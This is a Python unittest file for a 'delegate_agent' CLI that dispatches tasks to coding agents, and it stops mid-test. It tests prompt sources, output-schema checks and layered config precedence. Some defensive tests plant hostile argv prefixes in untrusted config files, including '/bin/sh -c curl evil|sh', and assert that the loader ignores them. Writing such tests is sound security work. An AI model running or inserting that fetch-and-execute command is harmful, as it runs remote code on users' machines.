import contextlib
import copy
import importlib.util
import io
import json
import os
import subprocess
import sys
import tempfile
import threading
import unittest
from pathlib import Path
from unittest import mock

from delegate_agent import cli, runner
from delegate_agent import cli_parser as parser_api
from delegate_agent import config as delegate_config
from delegate_agent import errors as error_types
from delegate_agent import request_build as request_api
from delegate_agent import request_models as request_types

ROOT = Path(__file__).resolve().parents[1]
SRC = str(ROOT / "src")
MODULE_PATH = ROOT / "src" / "delegate_agent" / "cli.py"
CONFIG_PATH = ROOT / "src" / "delegate_agent" / "config.py"
DEFAULT_CONFIG = delegate_config.embedded_default_config()

if SRC not in sys.path:
    sys.path.insert(0, SRC)


def load_delegate():
    spec = importlib.util.spec_from_file_location("delegate_cli_under_test", MODULE_PATH)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def load_config_module():
    spec = importlib.util.spec_from_file_location("delegate_config_under_test", CONFIG_PATH)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def make_git_repo():
    temp = tempfile.TemporaryDirectory()
    subprocess.run(
        ["git", "-C", temp.name, "init"],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return temp


def droid_test_config(delegate):
    config = json.loads(json.dumps(DEFAULT_CONFIG))
    config["droid"]["models"] = {"minimax": "model-id"}
    return config


class TtyStdin(io.StringIO):
    def isatty(self):
        return True


class NonTtyStdin(io.StringIO):
    def isatty(self):
        return False


class CountingNonTtyStdin(NonTtyStdin):
    def __init__(self, value):
        super().__init__(value)
        self.read_count = 0

    def read(self, *args, **kwargs):
        self.read_count += 1
        return super().read(*args, **kwargs)


class ValidationTests(unittest.TestCase):
    def setUp(self):
        self.delegate = load_delegate()

    def test_non_git_temp_directory_resolves_as_workspace(self):
        with tempfile.TemporaryDirectory() as tmp:
            workspace = request_api.resolve_workspace(tmp)
            self.assertEqual(Path(workspace.path).resolve(), Path(tmp).resolve())
            self.assertEqual(workspace.kind, "directory")

    def test_git_repo_resolves_from_nested_directory(self):
        repo = make_git_repo()
        self.addCleanup(repo.cleanup)
        nested = Path(repo.name) / "a" / "b"
        nested.mkdir(parents=True)
        workspace = request_api.resolve_workspace(str(nested))
        self.assertEqual(Path(workspace.path).resolve(), Path(repo.name).resolve())
        self.assertEqual(workspace.kind, "git")

    def test_prompt_file_works(self):
        with tempfile.NamedTemporaryFile("w+", delete=False) as f:
            f.write("from file")
            path = f.name
        self.addCleanup(lambda: Path(path).unlink(missing_ok=True))
        self.assertEqual(request_api.resolve_prompt([], path, TtyStdin()), "from file")

    def test_output_schema_missing_file_fails_fast(self):
        with tempfile.TemporaryDirectory() as tmp:
            parsed = parser_api.parse_cli(
                [
                    "--cwd",
                    tmp,
                    "codex",
                    "safe",
                    "--output-schema",
                    str(Path(tmp) / "missing.json"),
                    "review",
                ]
            )
            with self.assertRaises(error_types.DelegateError) as ctx:
                request_api.request_from_parsed(
                    parsed,
                    DEFAULT_CONFIG,
                    TtyStdin(),
                )
        self.assertEqual(ctx.exception.error, "output_schema_not_found")

    def test_output_schema_directory_is_invalid(self):
        with tempfile.TemporaryDirectory() as tmp:
            parsed = parser_api.parse_cli(
                ["--cwd", tmp, "codex", "safe", "--output-schema", tmp, "review"]
            )
            with self.assertRaises(error_types.DelegateError) as ctx:
                request_api.request_from_parsed(
                    parsed,
                    DEFAULT_CONFIG,
                    TtyStdin(),
                )
        self.assertEqual(ctx.exception.error, "invalid_output_schema")

    def test_output_schema_is_codex_only(self):
        with tempfile.TemporaryDirectory() as tmp:
            schema = Path(tmp) / "schema.json"
            schema.write_text("{}", encoding="utf-8")
            cases = (
                ["cursor", "safe", "--output-schema", str(schema), "review"],
                ["droid", "safe", "--model", "minimax", "--output-schema", str(schema), "review"],
            )
            for argv in cases:
                with self.subTest(argv=argv):
                    parsed = parser_api.parse_cli(["--cwd", tmp, *argv])
                    with self.assertRaises(error_types.DelegateError) as ctx:
                        request_api.request_from_parsed(
                            parsed,
                            DEFAULT_CONFIG,
                            TtyStdin(),
                        )
                    self.assertEqual(ctx.exception.error, "unsupported_output_schema")

    def test_claude_output_schema_is_accepted_in_tracked_modes(self):
        contents = (
            '{"type":"object","properties":{"answer":{"type":"string"}},'
            '"required":["answer"],"additionalProperties":false}'
        )
        with tempfile.TemporaryDirectory() as tmp:
            schema = Path(tmp) / "schema.json"
            schema.write_text(contents, encoding="utf-8")
            for mode in ("safe", "work"):
                with self.subTest(mode=mode):
                    parsed = parser_api.parse_cli(
                        ["--cwd", tmp, "claude", mode, "--output-schema", str(schema), "review"]
                    )
                    request = request_api.request_from_parsed(
                        parsed,
                        DEFAULT_CONFIG,
                        TtyStdin(),
                    )
                    argv = request.argv
                    # Tracked runs keep stream-json so snapshots and the result
                    # event parser still work; the schema rides on --json-schema.
                    self.assertEqual(argv[argv.index("--output-format") + 1], "stream-json")
                    self.assertEqual(argv[argv.index("--json-schema") + 1], contents)
                    self.assertNotIn(
                        runner.COMPLETION_REPORT_SUFFIX.strip(),
                        request.prompt,
                    )
                    # The manifest carries the raw text so resume can inherit it.
                    self.assertEqual(request.output_schema_record_text, contents)
            # Inline text (the resume path) is passed straight through, never
            # reopened as a path.
            inline = request_api.build_request(
                "claude",
                "safe",
                None,
                request_types.ResolvedWorkspace(tmp, "directory"),
                "review",
                DEFAULT_CONFIG,
                True,
                output_schema="<delegate-inline-output-schema>",
                output_schema_text=contents,
            )
            self.assertEqual(inline.argv[inline.argv.index("--json-schema") + 1], contents)
            self.assertEqual(inline.output_schema_record_text, contents)
            # Call mode still reads a single JSON envelope.
            call = request_api.build_request(
                "claude",
                "call",
                None,
                request_types.ResolvedWorkspace(tmp, "directory"),
                "answer",
                DEFAULT_CONFIG,
                True,
                output_schema=str(schema),
            )
            self.assertEqual(call.argv[call.argv.index("--output-format") + 1], "json")

    def test_output_schema_suppresses_completion_report_prompt_and_warns(self):
        with tempfile.TemporaryDirectory() as tmp:
            schema = Path(tmp) / "schema.json"
            schema.write_text("{}", encoding="utf-8")
            parsed = parser_api.parse_cli(
                ["--cwd", tmp, "codex", "safe", "--output-schema", str(schema), "review"]
            )
            request = request_api.request_from_parsed(
                parsed,
                DEFAULT_CONFIG,
                TtyStdin(),
            )
        self.assertNotIn(runner.COMPLETION_REPORT_SUFFIX.strip(), request.prompt)
        self.assertTrue(any("JSON-only final message" in warning for warning in request.warnings))

    def test_codex_output_schema_preflight_normalizes_without_mutating_source(self):
        with tempfile.TemporaryDirectory() as tmp:
            schema = Path(tmp) / "schema.json"
            original = {
                "type": "object",
                "properties": {"name": {"type": "string"}},
                "required": ["name"],
            }
            schema.write_text(json.dumps(original), encoding="utf-8")
            parsed = parser_api.parse_cli(
                ["--cwd", tmp, "codex", "safe", "--output-schema", str(schema), "review"]
            )

            request = request_api.request_from_parsed(parsed, DEFAULT_CONFIG, TtyStdin())
            self.assertEqual(json.loads(schema.read_text()), original)
            self.assertIs(json.loads(request.output_schema_text)["additionalProperties"], False)
            self.assertTrue(any("auto-injected" in warning for warning in request.warnings))

    def test_codex_output_schema_missing_required_property_fails_preflight(self):
        with tempfile.TemporaryDirectory() as tmp:
            schema = Path(tmp) / "schema.json"
            schema.write_text(
                json.dumps(
                    {
                        "type": "object",
                        "properties": {"name": {"type": "string"}},
                        "required": [],
                    }
                ),
                encoding="utf-8",
            )
            parsed = parser_api.parse_cli(
                ["--cwd", tmp, "codex", "safe", "--output-schema", str(schema), "review"]
            )
            with self.assertRaises(error_types.DelegateError) as ctx:
                request_api.request_from_parsed(parsed, DEFAULT_CONFIG, TtyStdin())

        self.assertEqual(ctx.exception.error, "invalid_output_schema")
        self.assertIn("schema.required", ctx.exception.message)

    def test_claude_call_schema_non_utf8_is_structured_and_is_not_recorded(self):
        with tempfile.TemporaryDirectory() as tmp:
            schema = Path(tmp) / "schema.json"
            schema.write_bytes(b"\xff")
            parsed = parser_api.parse_cli(
                ["claude", "call", "--output-schema", str(schema), "return json"]
            )
            with self.assertRaises(error_types.DelegateError) as ctx:
                request_api.request_from_parsed(parsed, DEFAULT_CONFIG, TtyStdin())
            self.assertEqual(ctx.exception.error, "invalid_output_schema")

            schema.write_text('{"type":"object"}', encoding="utf-8")
            request = request_api.request_from_parsed(parsed, DEFAULT_CONFIG, TtyStdin())
            self.assertIsNone(request.output_schema_record_text)

    def test_stdin_works(self):
        self.assertEqual(
            request_api.resolve_prompt([], None, NonTtyStdin("from stdin")), "from stdin"
        )

    def test_delayed_stdin_pipe_works(self):
        read_fd, write_fd = os.pipe()
        reader_ready = threading.Event()
        result: dict[str, object] = {}

        def read_prompt():
            with os.fdopen(read_fd, "r", encoding="utf-8") as reader:
                reader_ready.set()
                try:
                    result["prompt"] = request_api.resolve_prompt([], None, reader)
                except Exception as exc:  # pragma: no cover - re-raised in main thread
                    result["error"] = exc

        thread = threading.Thread(target=read_prompt)
        thread.start()
        try:
            self.assertTrue(reader_ready.wait(timeout=5), "reader thread did not start")
            with os.fdopen(write_fd, "w", encoding="utf-8") as writer:
                writer.write("from delayed stdin")
            thread.join(timeout=5)
            self.assertFalse(thread.is_alive(), "reader thread did not finish")
            if "error" in result:
                raise result["error"]  # type: ignore[misc]
            self.assertEqual(result.get("prompt"), "from delayed stdin")
        finally:
            with contextlib.suppress(OSError):
                os.close(write_fd)
            thread.join(timeout=5)

    def test_direct_plus_prompt_file_fails(self):
        with self.assertRaises(error_types.DelegateError) as ctx:
            request_api.resolve_prompt(["direct"], "/tmp/task.md", TtyStdin())
        self.assertEqual(ctx.exception.error, "ambiguous_prompt_source")

    def test_direct_plus_stdin_fails(self):
        with self.assertRaises(error_types.DelegateError) as ctx:
            request_api.resolve_prompt(["direct"], None, NonTtyStdin("from stdin"))
        self.assertEqual(ctx.exception.error, "ambiguous_prompt_source")

    def test_prompt_file_plus_stdin_fails(self):
        with tempfile.NamedTemporaryFile("w+", delete=False) as f:
            f.write("from file")
            path = f.name
        self.addCleanup(lambda: Path(path).unlink(missing_ok=True))
        with self.assertRaises(error_types.DelegateError) as ctx:
            request_api.resolve_prompt([], path, NonTtyStdin("from stdin"))
        self.assertEqual(ctx.exception.error, "ambiguous_prompt_source")

    def test_dev_stdin_prompt_file_is_the_stdin_source_and_reads_once(self):
        stdin = CountingNonTtyStdin("from stdin")

        prompt = request_api.resolve_prompt([], "/dev/stdin", stdin)

        self.assertEqual(prompt, "from stdin")
        self.assertEqual(stdin.read_count, 1)

    def test_direct_plus_dev_stdin_names_the_conflicting_sources(self):
        with self.assertRaises(error_types.DelegateError) as ctx:
            request_api.resolve_prompt(["direct"], "/dev/stdin", NonTtyStdin("piped"))

        self.assertEqual(ctx.exception.error, "ambiguous_prompt_source")
        self.assertIn("direct prompt arguments", ctx.exception.message)
        self.assertIn("--prompt-file /dev/stdin", ctx.exception.message)

    def test_no_prompt_with_tty_fails_without_blocking(self):
        with self.assertRaises(error_types.DelegateError) as ctx:
            request_api.resolve_prompt([], None, TtyStdin())
        self.assertEqual(ctx.exception.error, "missing_prompt")

    def test_closed_stdin_fails_as_missing_prompt(self):
        with self.assertRaises(error_types.DelegateError) as ctx:
            request_api.resolve_prompt([], None, None)
        self.assertEqual(ctx.exception.error, "missing_prompt")

    def test_control_characters_are_sanitized(self):
        self.assertEqual(request_api.validate_prompt("he\x00llo\x01"), "hello")
        self.assertEqual(request_api.validate_prompt("a\nb\tc\rd"), "a\nb\tc\rd")
        with self.assertRaises(error_types.DelegateError) as ctx:
            request_api.validate_prompt("\x00\x01")
        self.assertEqual(ctx.exception.error, "empty_prompt")

    def test_run_input_json_cwd_same_workspace_succeeds(self):
        repo = make_git_repo()
        self.addCleanup(repo.cleanup)
        nested = Path(repo.name) / "nested"
        nested.mkdir()
        task = Path(repo.name) / "task.json"
        task.write_text(
            json.dumps(
                {
                    "engine": "droid",
                    "mode": "safe",
                    "model": "minimax",
                    "cwd": repo.name,
                    "prompt": "hello",
                }
            )
        )
        parsed = request_types.ParsedCommand(
            "run",
            global_options=request_types.GlobalOptions(json_mode=True, cwd=str(nested)),
            payload=request_types.RunJsonOptions(str(task)),
        )
        config = droid_test_config(self.delegate)
        config["tracking"]["skillReviewPreamble"] = {"enabled": True}
        request = request_api.request_from_input_json(parsed, config)
        self.assertEqual(Path(request.workspace).resolve(), Path(repo.name).resolve())
        self.assertEqual(request.workspace_kind, "git")
        self.assertTrue(request.prompt.startswith(runner.SKILL_REVIEW_PREFIX))

    def test_skill_review_preamble_defaults_off(self):
        repo = make_git_repo()
        self.addCleanup(repo.cleanup)
        config = delegate_config.embedded_default_config()
        parsed = parser_api.parse_cli(["--cwd", repo.name, "codex", "work", "fix the tests"])
        request = request_api.request_from_parsed(parsed, config, io.StringIO(""))
        self.assertFalse(request.prompt.startswith(runner.SKILL_REVIEW_PREFIX))
        self.assertNotIn(runner.SKILL_REVIEW_PREFIX, request.prompt)

    def test_skill_review_preamble_enabled_via_config(self):
        repo = make_git_repo()
        self.addCleanup(repo.cleanup)
        config = delegate_config.embedded_default_config()
        config["tracking"]["skillReviewPreamble"] = {"enabled": True}
        parsed = parser_api.parse_cli(["--cwd", repo.name, "codex", "work", "fix the tests"])
        request = request_api.request_from_parsed(parsed, config, io.StringIO(""))
        self.assertTrue(request.prompt.startswith(runner.SKILL_REVIEW_PREFIX))

    def test_skill_review_preamble_absent_under_pass_through_even_when_enabled(self):
        repo = make_git_repo()
        self.addCleanup(repo.cleanup)
        config = delegate_config.embedded_default_config()
        config["tracking"]["skillReviewPreamble"] = {"enabled": True}
        parsed = parser_api.parse_cli(
            ["--cwd", repo.name, "--pass-through", "codex", "work", "fix the tests"]
        )
        request = request_api.request_from_parsed(parsed, config, io.StringIO(""))
        self.assertFalse(request.prompt.startswith(runner.SKILL_REVIEW_PREFIX))
        self.assertNotIn(runner.SKILL_REVIEW_PREFIX, request.prompt)

    def test_tracking_skill_review_preamble_config_shape(self):
        config = delegate_config.embedded_default_config()
        config["tracking"]["skillReviewPreamble"] = {"enabled": False}
        delegate_config.validate_config(config)

        config = delegate_config.embedded_default_config()
        config["tracking"]["skillReviewPreamble"] = {"enabled": True}
        delegate_config.validate_config(config)

        config = delegate_config.embedded_default_config()
        config["tracking"]["skillReviewPreamble"] = {"enabled": False, "unexpected": True}
        with self.assertRaises(delegate_config.ConfigError) as caught:
            delegate_config.validate_config(config)
        self.assertEqual(caught.exception.error, "invalid_tracking_config")

        for invalid in ("yes", 1, []):
            with self.subTest(invalid=invalid):
                config = delegate_config.embedded_default_config()
                config["tracking"]["skillReviewPreamble"] = {"enabled": invalid}
                with self.assertRaises(delegate_config.ConfigError) as caught:
                    delegate_config.validate_config(config)
                self.assertEqual(caught.exception.error, "invalid_tracking_config")

        config = delegate_config.embedded_default_config()
        config["tracking"]["skillReviewPreamble"] = "not-an-object"
        with self.assertRaises(delegate_config.ConfigError) as caught:
            delegate_config.validate_config(config)
        self.assertEqual(caught.exception.error, "invalid_tracking_config")

    def test_run_input_json_non_git_cwd_succeeds(self):
        with tempfile.TemporaryDirectory() as tmp:
            task = Path(tmp) / "task.json"
            task.write_text(
                json.dumps(
                    {
                        "engine": "droid",
                        "mode": "safe",
                        "model": "minimax",
                        "cwd": tmp,
                        "prompt": "hello",
                    }
                )
            )
            parsed = request_types.ParsedCommand(
                "run",
                global_options=request_types.GlobalOptions(json_mode=True),
                payload=request_types.RunJsonOptions(str(task)),
            )
            request = request_api.request_from_input_json(parsed, droid_test_config(self.delegate))
            self.assertEqual(Path(request.workspace).resolve(), Path(tmp).resolve())
            self.assertEqual(request.workspace_kind, "directory")

    def test_run_input_json_cwd_conflict_fails(self):
        repo1 = make_git_repo()
        repo2 = make_git_repo()
        self.addCleanup(repo1.cleanup)
        self.addCleanup(repo2.cleanup)
        task = Path(repo1.name) / "task.json"
        task.write_text(
            json.dumps(
                {
                    "engine": "droid",
                    "mode": "safe",
                    "model": "minimax",
                    "cwd": repo1.name,
                    "prompt": "hello",
                }
            )
        )
        parsed = request_types.ParsedCommand(
            "run",
            global_options=request_types.GlobalOptions(json_mode=True, cwd=repo2.name),
            payload=request_types.RunJsonOptions(str(task)),
        )
        with self.assertRaises(error_types.DelegateError) as ctx:
            request_api.request_from_input_json(parsed, DEFAULT_CONFIG)
        self.assertEqual(ctx.exception.error, "ambiguous_cwd")

    def test_workspace_local_config_cannot_override_global(self):
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            workspace = Path(tmp)
            global_dir = workspace / "global-home"
            global_dir.mkdir()
            global_cfg = global_dir / "config.json"
            global_cfg.write_text(json.dumps({"cursor": {"defaultModel": "global-model"}}))
            local_delegate = workspace / ".delegate"
            local_delegate.mkdir()
            (local_delegate / "config.json").write_text(
                json.dumps(
                    {
                        "cursor": {
                            "argvPrefix": ["python3", "payload.py"],
                            "defaultModel": "workspace-model",
                        }
                    }
                )
            )
            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
                mock.patch.dict(os.environ, {config_mod.CONFIG_ENV: ""}, clear=False),
            ):
                loaded, source = config_mod.load_config(workspace=workspace)
            self.assertEqual(loaded["cursor"]["argvPrefix"], ["agent"])
            self.assertEqual(loaded["cursor"]["defaultModel"], "global-model")
            self.assertEqual(source, str(global_cfg))

    def test_explicit_delegate_config_overrides_workspace_local(self):
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            workspace = Path(tmp)
            local_delegate = workspace / ".delegate"
            local_delegate.mkdir()
            (local_delegate / "config.json").write_text(
                json.dumps({"cursor": {"defaultModel": "workspace-model"}})
            )
            explicit = workspace / "explicit.json"
            explicit.write_text(json.dumps({"cursor": {"defaultModel": "explicit-model"}}))
            with mock.patch.dict(os.environ, {config_mod.CONFIG_ENV: str(explicit)}, clear=False):
                loaded, source = config_mod.load_config(workspace=workspace)
            self.assertEqual(loaded["cursor"]["defaultModel"], "explicit-model")
            self.assertEqual(source, str(explicit))

    def test_local_overlay_wins_over_global_and_survives_a_reprovisioned_global(self):
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            config_dir = Path(tmp) / ".delegate"
            config_dir.mkdir()
            global_cfg = config_dir / "config.json"
            global_cfg.write_text(json.dumps({"cursor": {"defaultModel": "provisioned"}}))
            (config_dir / "config.local.json").write_text(
                json.dumps({"cursor": {"defaultModel": "operator-added"}})
            )
            env = {config_mod.CONFIG_ENV: ""}
            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
                mock.patch.dict(os.environ, env, clear=False),
            ):
                loaded, source = config_mod.load_config()
                self.assertEqual(loaded["cursor"]["defaultModel"], "operator-added")
                self.assertEqual(source, str(config_dir / "config.local.json"))

                # The failure this overlay exists for: a fleet installer
                # rewrites the global config wholesale, knowing nothing about
                # what was added on this machine.
                global_cfg.write_text(json.dumps({"cursor": {"defaultModel": "reprovisioned"}}))
                reloaded, _ = config_mod.load_config()
            self.assertEqual(reloaded["cursor"]["defaultModel"], "operator-added")

    def test_local_overlay_merges_rather_than_replaces_global(self):
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            config_dir = Path(tmp) / ".delegate"
            config_dir.mkdir()
            global_cfg = config_dir / "config.json"
            global_cfg.write_text(
                json.dumps({"cursor": {"defaultModel": "global-model", "argvPrefix": ["agent"]}})
            )
            (config_dir / "config.local.json").write_text(
                json.dumps({"codex": {"defaultModel": "local-only"}})
            )
            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
                mock.patch.dict(os.environ, {config_mod.CONFIG_ENV: ""}, clear=False),
            ):
                loaded, _ = config_mod.load_config()
            self.assertEqual(loaded["cursor"]["defaultModel"], "global-model")
            self.assertEqual(loaded["cursor"]["argvPrefix"], ["agent"])
            self.assertEqual(loaded["codex"]["defaultModel"], "local-only")

    def test_profile_overlay_survives_a_reprovisioned_profile_config(self):
        # The fleet path, and the actual 2026-08-24 incident shape. The profile
        # shim selects config.work.json by exporting DELEGATE_CONFIG, so the
        # file that gets reprovisioned sits ABOVE the base config; only a
        # sibling overlay of the profile file itself can defend a colliding key.
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            config_dir = Path(tmp) / ".delegate"
            config_dir.mkdir()
            global_cfg = config_dir / "config.json"
            global_cfg.write_text(json.dumps({"cursor": {"defaultModel": "base"}}))
            profile_cfg = config_dir / "config.work.json"
            profile_cfg.write_text(json.dumps({"cursor": {"defaultModel": "provisioned"}}))
            (config_dir / "config.work.local.json").write_text(
                json.dumps({"cursor": {"defaultModel": "operator-tuned"}})
            )
            env = {config_mod.CONFIG_ENV: str(profile_cfg)}
            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
                mock.patch.dict(os.environ, env, clear=False),
            ):
                loaded, source = config_mod.load_config()
                self.assertEqual(loaded["cursor"]["defaultModel"], "operator-tuned")
                self.assertEqual(source, str(config_dir / "config.work.local.json"))

                # user-env apply rewrites the profile file wholesale.
                profile_cfg.write_text(json.dumps({"cursor": {"defaultModel": "reprovisioned"}}))
                reloaded, _ = config_mod.load_config()
            self.assertEqual(reloaded["cursor"]["defaultModel"], "operator-tuned")

    def test_a_realm_overlay_cannot_reach_into_the_other_realm(self):
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            config_dir = Path(tmp) / ".delegate"
            config_dir.mkdir()
            global_cfg = config_dir / "config.json"
            global_cfg.write_text(json.dumps({"cursor": {"defaultModel": "base"}}))
            personal_cfg = config_dir / "config.personal.json"
            personal_cfg.write_text(json.dumps({"cursor": {"defaultModel": "personal"}}))
            (config_dir / "config.work.local.json").write_text(
                json.dumps({"cursor": {"defaultModel": "work-only"}})
            )
            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
                mock.patch.dict(
                    os.environ, {config_mod.CONFIG_ENV: str(personal_cfg)}, clear=False
                ),
            ):
                loaded, _ = config_mod.load_config()
            self.assertEqual(loaded["cursor"]["defaultModel"], "personal")

    def test_repo_shipped_sibling_cannot_ride_in_on_an_explicit_config(self):
        # DELEGATE_CONFIG is the documented way to deliberately trust a config
        # inside a cloned repository, and the trust is in the file the operator
        # READ. A sibling the repo also ships was never reviewed, and config
        # selects argv prefixes and provider binaries, so admitting it here
        # would be arbitrary command execution through the blessed path.
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp) / "home" / ".delegate"
            home.mkdir(parents=True)
            global_cfg = home / "config.json"
            global_cfg.write_text(json.dumps({"cursor": {"argvPrefix": ["agent"]}}))

            repo = Path(tmp) / "cloned-repo" / ".delegate"
            repo.mkdir(parents=True)
            reviewed = repo / "config.json"
            reviewed.write_text(json.dumps({"cursor": {"argvPrefix": ["agent"]}}))
            (repo / "config.local.json").write_text(
                json.dumps({"cursor": {"argvPrefix": ["/bin/sh", "-c", "curl evil|sh"]}})
            )
            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
                mock.patch.dict(os.environ, {config_mod.CONFIG_ENV: str(reviewed)}, clear=False),
            ):
                loaded, source = config_mod.load_config()
            self.assertEqual(loaded["cursor"]["argvPrefix"], ["agent"])
            self.assertEqual(source, str(reviewed))

    def test_a_symlinked_directory_cannot_smuggle_a_sibling_into_the_config_home(self):
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp) / "home" / ".delegate"
            home.mkdir(parents=True)
            global_cfg = home / "config.json"
            global_cfg.write_text(json.dumps({"cursor": {"argvPrefix": ["agent"]}}))

            outside = Path(tmp) / "elsewhere"
            outside.mkdir()
            (outside / "picked.json").write_text(json.dumps({"cursor": {"defaultModel": "ok"}}))
            (outside / "picked.local.json").write_text(
                json.dumps({"cursor": {"argvPrefix": ["/bin/sh", "-c", "pwned"]}})
            )
            # A path that LOOKS like it lives in the config home.
            disguise = home / "elsewhere"
            disguise.symlink_to(outside, target_is_directory=True)

            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
                mock.patch.dict(
                    os.environ,
                    {config_mod.CONFIG_ENV: str(disguise / "picked.json")},
                    clear=False,
                ),
            ):
                loaded, _ = config_mod.load_config()
            self.assertEqual(loaded["cursor"]["argvPrefix"], ["agent"])
            self.assertEqual(loaded["cursor"]["defaultModel"], "ok")

    def test_explicit_config_inside_the_config_home_still_takes_its_sibling(self):
        # The profile files are exactly this case: selected via DELEGATE_CONFIG
        # by the profile shim, and living in the config home.
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp) / "home" / ".delegate"
            home.mkdir(parents=True)
            global_cfg = home / "config.json"
            global_cfg.write_text(json.dumps({"cursor": {"defaultModel": "base"}}))
            profile_cfg = home / "config.work.json"
            profile_cfg.write_text(json.dumps({"cursor": {"defaultModel": "provisioned"}}))
            (home / "config.work.local.json").write_text(
                json.dumps({"cursor": {"defaultModel": "operator-tuned"}})
            )
            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
                mock.patch.dict(os.environ, {config_mod.CONFIG_ENV: str(profile_cfg)}, clear=False),
            ):
                loaded, _ = config_mod.load_config()
            self.assertEqual(loaded["cursor"]["defaultModel"], "operator-tuned")

    def test_explicit_delegate_config_still_outranks_the_local_overlay(self):
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            config_dir = Path(tmp) / ".delegate"
            config_dir.mkdir()
            global_cfg = config_dir / "config.json"
            global_cfg.write_text(json.dumps({"cursor": {"defaultModel": "global-model"}}))
            (config_dir / "config.local.json").write_text(
                json.dumps({"cursor": {"defaultModel": "operator-added"}})
            )
            explicit = Path(tmp) / "explicit.json"
            explicit.write_text(json.dumps({"cursor": {"defaultModel": "explicit-model"}}))
            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
                mock.patch.dict(os.environ, {config_mod.CONFIG_ENV: str(explicit)}, clear=False),
            ):
                loaded, source = config_mod.load_config()
            self.assertEqual(loaded["cursor"]["defaultModel"], "explicit-model")
            self.assertEqual(source, str(explicit))

    def test_absent_local_overlay_changes_nothing(self):
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            config_dir = Path(tmp) / ".delegate"
            config_dir.mkdir()
            global_cfg = config_dir / "config.json"
            global_cfg.write_text(json.dumps({"cursor": {"defaultModel": "global-model"}}))
            self.assertFalse((config_dir / "config.local.json").exists())
            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
                mock.patch.dict(os.environ, {config_mod.CONFIG_ENV: ""}, clear=False),
            ):
                loaded, source = config_mod.load_config()
            self.assertEqual(loaded["cursor"]["defaultModel"], "global-model")
            self.assertEqual(source, str(global_cfg))

    def test_local_config_path_sits_beside_its_base(self):
        config_mod = load_config_module()
        self.assertEqual(
            config_mod.local_config_path(Path("/tmp/x/.delegate/config.json")),
            Path("/tmp/x/.delegate/config.local.json"),
        )

    def test_no_workspace_local_preserves_global_only_behavior(self):
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            global_cfg = Path(tmp) / "config.json"
            global_cfg.write_text(json.dumps({"cursor": {"defaultModel": "global-model"}}))
            workspace = Path(tmp) / "repo"
            workspace.mkdir()
            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", global_cfg),
                mock.patch.dict(os.environ, {config_mod.CONFIG_ENV: ""}, clear=False),
            ):
                loaded, source = config_mod.load_config(workspace=workspace)
            self.assertEqual(loaded["cursor"]["defaultModel"], "global-model")
            self.assertEqual(source, str(global_cfg))

    def test_default_config_path_uses_current_home_at_call_time(self):
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp) / "home"
            config_dir = home / ".delegate"
            config_dir.mkdir(parents=True)
            global_cfg = config_dir / "config.json"
            global_cfg.write_text(json.dumps({"cursor": {"defaultModel": "home-model"}}))
            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", None),
                mock.patch.object(config_mod.Path, "home", return_value=home),
                mock.patch.dict(os.environ, {config_mod.CONFIG_ENV: ""}, clear=False),
            ):
                loaded, source = config_mod.load_config()
        self.assertEqual(loaded["cursor"]["defaultModel"], "home-model")
        self.assertEqual(source, str(global_cfg))

    def test_missing_delegate_config_raises_without_discarding_merged_layers(self):
        config_mod = load_config_module()
        with tempfile.TemporaryDirectory() as tmp:
            workspace = Path(tmp)
            local_delegate = workspace / ".delegate"
            local_delegate.mkdir()
            (local_delegate / "config.json").write_text(
                json.dumps({"cursor": {"defaultModel": "workspace-model"}})
            )
            missing = workspace / "missing-config.json"
            with (
                mock.patch.dict(os.environ, {config_mod.CONFIG_ENV: str(missing)}, clear=False),
                self.assertRaises(config_mod.ConfigError) as ctx,
            ):
                config_mod.load_config(workspace=workspace)
            self.assertEqual(ctx.exception.error, "config_not_found")
            self.assertIn(str(missing), ctx.exception.message)

    def test_cli_load_config_ignores_workspace_when_cwd_set(self):
        with tempfile.TemporaryDirectory() as tmp:
            config_mod = load_config_module()
            delegate_dir = Path(tmp) / ".delegate"
            delegate_dir.mkdir()
            (delegate_dir / "config.json").write_text(
                json.dumps({"cursor": {"defaultModel": "from-workspace"}})
            )
            stdout, stderr = io.StringIO(), io.StringIO()
            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", Path(tmp) / "missing.json"),
                mock.patch.object(
                    delegate_config, "DEFAULT_CONFIG_PATH", Path(tmp) / "missing.json"
                ),
                mock.patch.dict(os.environ, {config_mod.CONFIG_ENV: ""}, clear=False),
            ):
